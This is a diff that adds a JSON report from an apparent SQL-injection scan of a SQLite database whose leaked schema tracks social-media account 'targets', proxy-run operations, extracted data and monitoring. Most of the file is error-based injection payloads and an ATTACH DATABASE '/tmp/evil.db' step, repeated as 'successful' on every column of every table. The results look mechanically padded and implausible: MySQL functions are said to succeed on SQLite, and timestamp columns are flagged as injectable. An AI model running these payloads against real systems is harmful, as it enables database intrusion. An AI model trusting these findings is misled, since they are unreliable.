+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "duration_seconds",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "data_extracted",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "data_extracted",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "data_extracted",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        }
+      ],
+      "successful_payloads": [
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+      ],
+      "extracted_data": {},
+      "risk_level": "CRITICAL"
+    },
+    "extracted_data": {
+      "table": "extracted_data",
+      "vulnerable_points": [
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "target_id",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "target_id",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "target_id",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "operation_id",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "operation_id",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "operation_id",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "data_type",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "data_type",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "data_type",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "data_content",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "data_content",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "data_content",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "file_path",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "file_path",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "file_path",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "extracted_at",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "extracted_at",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "extracted_at",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "data_size",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "data_size",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "data_size",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "is_sensitive",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "is_sensitive",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "is_sensitive",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        }
+      ],
+      "successful_payloads": [
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+      ],
+      "extracted_data": {},
+      "risk_level": "CRITICAL"
+    },
+    "target_relationships": {
+      "table": "target_relationships",
+      "vulnerable_points": [
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "source_target_id",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "source_target_id",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "source_target_id",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "related_target_id",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "related_target_id",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "related_target_id",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "relationship_type",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "relationship_type",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "relationship_type",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "discovered_at",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "discovered_at",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "discovered_at",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "confidence_score",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "confidence_score",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "confidence_score",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        }
+      ],
+      "successful_payloads": [
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+      ],
+      "extracted_data": {},
+      "risk_level": "CRITICAL"
+    },
+    "monitoring": {
+      "table": "monitoring",
+      "vulnerable_points": [
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "target_id",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "target_id",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "target_id",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "check_type",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "check_type",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "check_type",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "check_result",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "check_result",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "check_result",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "changes_detected",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "changes_detected",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "changes_detected",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "checked_at",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "checked_at",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "checked_at",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        }
+      ],
+      "successful_payloads": [
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+      ],
+      "extracted_data": {},
+      "risk_level": "CRITICAL"
+    }
+  },
+  "privilege_escalation": {
+    "database": "integrated_targets_2025.db",
+    "successful_techniques": [
+      {
+        "type": "command_execution",
+        "technique": "PRAGMA temp_store_directory='/tmp'"
+      },
+      {
+        "type": "command_execution",
+        "technique": "ATTACH DATABASE '/tmp/evil.db' AS evil"
+      },
+      {
+        "type": "information_disclosure",
+        "technique": "SELECT * FROM sqlite_master"
+      },
+      {
+        "type": "information_disclosure",
+        "technique": "PRAGMA database_list"
+      },
+      {
+        "type": "information_disclosure",
+        "technique": "SELECT sql FROM sqlite_master WHERE type='table'"
+      },
+      {
+        "type": "information_disclosure",
+        "technique": "SELECT name,file FROM pragma_database_list"
+      }
+    ],
+    "information_disclosed": {
+      "table_schemas": [
+        [
+          "targets",
+          "CREATE TABLE targets (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                username TEXT UNIQUE NOT NULL,\n                full_name TEXT,\n                profile_pic_url TEXT,\n                follower_count INTEGER DEFAULT 0,\n                following_count INTEGER DEFAULT 0,\n                post_count INTEGER DEFAULT 0,\n                is_private BOOLEAN DEFAULT 0,\n                is_verified BOOLEAN DEFAULT 0,\n                biography TEXT,\n                external_url TEXT,\n                target_type TEXT DEFAULT 'standard',\n                priority INTEGER DEFAULT 1,\n                status TEXT DEFAULT 'pending',\n                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n                last_accessed TIMESTAMP,\n                notes TEXT\n            )"
+        ],
+        [
+          "sqlite_sequence",
+          "CREATE TABLE sqlite_sequence(name,seq)"
+        ],
+        [
+          "operations",
+          "CREATE TABLE operations (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                target_id INTEGER,\n                operation_type TEXT NOT NULL,\n                operation_data TEXT,\n                result_data TEXT,\n                status TEXT DEFAULT 'pending',\n                started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n                completed_at TIMESTAMP,\n                error_message TEXT,\n                proxy_used TEXT,\n                session_used TEXT,\n                duration_seconds INTEGER,\n                data_extracted INTEGER DEFAULT 0,\n                FOREIGN KEY (target_id) REFERENCES targets (id)\n            )"
+        ],
+        [
+          "extracted_data",
+          "CREATE TABLE extracted_data (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                target_id INTEGER,\n                operation_id INTEGER,\n                data_type TEXT NOT NULL,\n                data_content TEXT NOT NULL,\n                file_path TEXT,\n                extracted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n                data_size INTEGER DEFAULT 0,\n                is_sensitive BOOLEAN DEFAULT 0,\n                FOREIGN KEY (target_id) REFERENCES targets (id),\n                FOREIGN KEY (operation_id) REFERENCES operations (id)\n            )"
+        ],
+        [
+          "target_relationships",
+          "CREATE TABLE target_relationships (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                source_target_id INTEGER,\n                related_target_id INTEGER,\n                relationship_type TEXT,\n                discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n                confidence_score REAL DEFAULT 0.5,\n                FOREIGN KEY (source_target_id) REFERENCES targets (id),\n                FOREIGN KEY (related_target_id) REFERENCES targets (id)\n            )"
+        ],
+        [
+          "monitoring",
+          "CREATE TABLE monitoring (\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\n                target_id INTEGER,\n                check_type TEXT NOT NULL,\n                check_result TEXT,\n                changes_detected TEXT,\n                checked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n                FOREIGN KEY (target_id) REFERENCES targets (id)\n            )"
+        ]
+      ],
+      "attached_databases": [
+        [
+          0,
+          "main",
+          "/workspaces/sugarglitch-realops/integrated_targets_2025.db"
+        ],
+        [
+          2,
+          "evil",
+          "/tmp/evil.db"
+        ]
+      ]
+    },
+    "file_access_possible": false,
+    "command_execution_possible": false,
+    "risk_assessment": "CRITICAL"
+  },
+  "data_exfiltration": {
+    "database": "integrated_targets_2025.db",
+    "extractable_tables": [
+      {
+        "table": "targets",
+        "row_count": 0,
+        "has_sensitive_data": false
+      },
+      {
+        "table": "sqlite_sequence",
+        "row_count": 0,
+        "has_sensitive_data": false
+      },
+      {
+        "table": "operations",
+        "row_count": 0,
+        "has_sensitive_data": false
+      },
+      {
+        "table": "extracted_data",
+        "row_count": 0,
+        "has_sensitive_data": false
+      },
+      {
+        "table": "target_relationships",
+        "row_count": 0,
+        "has_sensitive_data": false
+      },
+      {
+        "table": "monitoring",
+        "row_count": 0,
+        "has_sensitive_data": false
+      }
+    ],
+    "sample_data": {
+      "targets": [],
+      "sqlite_sequence": [],
+      "operations": [],
+      "extracted_data": [],
+      "target_relationships": [],
+      "monitoring": []
+    },
+    "total_records": 0,
+    "sensitive_data_found": [],
+    "exfiltration_risk": "MEDIUM"
+  },
+  "security_report": {
+    "overall_risk": "CRITICAL",
+    "critical_findings": [
+      "Critical SQL injection vulnerability in table: targets",
+      "Critical SQL injection vulnerability in table: sqlite_sequence",
+      "Critical SQL injection vulnerability in table: operations",
+      "Critical SQL injection vulnerability in table: extracted_data",
+      "Critical SQL injection vulnerability in table: target_relationships",
+      "Critical SQL injection vulnerability in table: monitoring",
+      "Critical privilege escalation possible"
+    ],
+    "recommendations": [
+      "🔒 Implement proper input validation and parameterized queries",
+      "🛡️ Set restrictive file permissions on database files (600 or 640)",
+      "🔐 Enable database encryption for sensitive data",
+      "📊 Implement database activity monitoring and logging",
+      "🚫 Disable unnecessary database functions and extensions",
+      "🔑 Use strong authentication and access controls",
+      "📋 Regular security audits and penetration testing",
+      "💾 Implement secure backup and recovery procedures",
+      "🔍 Monitor for unusual database access patterns",
+      "📚 Security awareness training for developers"
+    ],
+    "summary": {
+      "total_tables_tested": 6,
+      "vulnerabilities_found": 7,
+      "sensitive_data_detected": 0,
+      "test_timestamp": "2025-06-03T00:55:29.326548"
+    }
+  }
+}
